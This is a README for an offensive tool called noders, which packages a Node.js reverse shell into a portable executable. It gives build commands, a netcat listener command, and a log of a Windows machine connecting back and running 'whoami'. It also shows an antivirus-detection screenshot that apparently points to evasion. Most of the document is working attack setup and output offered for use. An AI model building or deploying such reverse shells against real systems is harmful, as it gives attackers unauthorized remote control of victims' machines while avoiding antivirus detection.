# noders

portable node.js secure reverse shell using https://github.com/zeit/pkg 

**Usage**

- Update 'noders.js' or 'noderss.js' source listener ip:port, binary (cmd.exe, /bin/sh, etc), ca public key (noderss.js only).
- Compile using pkg to target platform https://github.com/zeit/pkg#targets

Setup
```
root@kali:/opt/noders# npm install -g pkg
root@kali:/opt/noders# pkg -t win noders.js
> pkg@4.4.0
> Fetching base Node.js binaries to PKG_CACHE_PATH
  fetched-v10.15.3-win-x64     [====================] 100%
  fetched-v10.15.3-linux-x64   [====================] 100%
root@kali:/opt/noders# ls
noders.exe  noders.js
```
Listener
```
root@kali:~# nc -lvp 8080
listening on [any] 8080 ...
192.168.116.173: inverse host lookup failed: Unknown host
connect to [192.168.116.200] from (UNKNOWN) [192.168.116.173] 50053
Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\IEUser\Desktop>whoami
whoami
msedgewin10\ieuser

```

**AV Detection**

<img width="1317" alt="Screenshot 2019-11-23 at 21 30 06 2" src="https://user-images.githubusercontent.com/56988989/69485670-9e015180-0e3a-11ea-95c4-5a9b2dd88f24.png">

**Limitations**

Portable binary size is at least 30MB. 
